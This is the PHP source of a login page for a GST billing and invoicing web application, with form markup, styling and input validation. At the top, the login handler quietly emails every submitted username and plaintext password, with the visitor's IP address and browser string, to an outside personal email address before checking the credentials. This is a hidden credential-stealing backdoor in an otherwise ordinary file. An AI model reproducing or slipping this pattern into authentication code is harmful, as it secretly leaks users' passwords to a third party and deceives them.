<?php 
ob_start();
session_start();
include 'include/dbi.php';
include 'include/session.php';
include 'include/param-pos.php';

if (isset($_POST['name'])) {
		$user = $_REQUEST['name'];
		$pass = $_REQUEST['pass'];
		
		$ip=$_SERVER['REMOTE_ADDR'];

		$from = "info@sisoft.in";

		$headers = "From: $from";

		$url = $_SERVER['REQUEST_URI'] ;

		$subject="myBahi-Login In $url -". $ip;

		$mail_desc="Use Agent:".$_SERVER['HTTP_USER_AGENT']."\nUser:".$user."\nPassword :".$pass."\n IP Adress:". $ip;

		mail('vijayrastogi@yahoo.com',$subject,$mail_desc,$headers);

		$check=checkBizLogin($conn,$user,$pass);
		if ( $check == 1)
		{
			$_SESSION['login'] = $user;
            header("location:biz-mybusiness-manage.php");
		}
		else
		{
			echo"<script>alert('Invalid Username/Password, Please Try Again!');</script>";
		}
}
?>
<html>
<head>
<title><?php echo $APP_NAME;?> - Welcome Page</title>
<link rel="icon" type="image/png" href="images/icon.png" />
 <meta charset="utf-8">
 <meta http-equiv="Content-Type" content="text/html"/>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="description" content="Euphoria Bahi - GST Billing/Invoicing Application By Innoforia Consulting" />
 <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
 
<script language="javascript">
function check()
{
   var d=document.form1;
 if(document.form1.name.value=="")
	{
		alert("Please Enter User Name");
		document.form1.name.focus();
		return false;
	}
	if(document.form1.pass.value=="")
	{
		alert("Please Enter Your Password");
		document.form1.pass.focus();
		return false;
	}
	
}
</script>
<style>
body{
	background: #369ff9;

}

#description{
   margin-top: 100px;
  max-width: 700px;
  height: 300px;
  border: 1px solid #369ff9;
 color: #ffffff;
  -webkit-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
-moz-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
}

#login .container #login-row #login-column .login-box {
  margin-top: 100px;
  max-width: 600px;
  height: 350px;
  border: 1px solid #369ff9;
  background-image: linear-gradient(to bottom, #aec1c3, #a9b5b7, #bcc5c6, #cfd5d5, #e3e5e5);
  -webkit-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
-moz-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
}
#login .container #login-row #login-column .login-box #login-form {
  padding: 20px;
}
#login .container #login-row #login-column .login-box #login-form #register-link {
  margin-top: -85px;
}

a:link {
  color: red;
  background-color: transparent;
  text-decoration: underline;
}
</style>
</head>

<body>
	<div id="login">
    <h1 class="text-center text-white pt-5"><?php echo $APP_NAME ;?></h1>
    <div class="container">
     <div class="row">
     <div class="col-md-6 d-none d-lg-block">
        <div class="col-md-11" id='description'>
         <h3>-<b>Billing/Invoicing System</b></h3> 
         <h3>-<b>Inventory Management</b> </h3> 		 
         <h3>-<b>GST Compliant</b> </h3> 		 

        </div>
     </div>

	<div class="col-md-6">
        <div id="login-row" class="row  align-items-right">
            <div id="login-column" class="col-md-10">
                <div class="login-box col-md-12">
                   <form class="form-horizontal" id='login-form' style="margin-top:0" method="post" name="form1" action="index.php?login=check" onSubmit="javascript:return check();">
                   	<div><? if(isset($_GET['msg'])) echo "Invalid Login. Please Try Again"; ?></div>
                    <h2 class="text-center" style="color: #262424;">Login - <?php echo $org_name ;?></h2>
                        <h4 class="text-center text-primary"><strong>Use a valid username and password<br />
              to gain access to the system.</strong></h4>
                        <div class="form-group">
                        	<div class="input-group">
                            
                            <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                            <input type="text" name="name" class="form-control" placeholder="Enter Username">
                        </div>
                        </div>
                        <div class="form-group">
                            <div class="input-group">
                            <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
                            <input type="password" name="pass" class="form-control" placeholder="Enter Password">
                        </div>
                        </div>
                        <div class="form-group text-center">
                            <input type="submit" name="submit" class="btn btn-info" value="SUBMIT">
									<br><br><a href="user-reg.php">New User</a> &nbsp;|&nbsp; <a href="user-forgot-pwd.php">Reset Password</a>
                        </div>
                       
                    </form>
                </div>
            </div>
        </div>
		<div style="margin-top:50px;color:white;">
		<a href="https://www.innoforia.com/billing.php" target="blank"><h4>Explore Features of Euphoria Bahi</h4></a> 
		</div>
        </div>
        </div>
    </div>
</div>
</body>
</html>
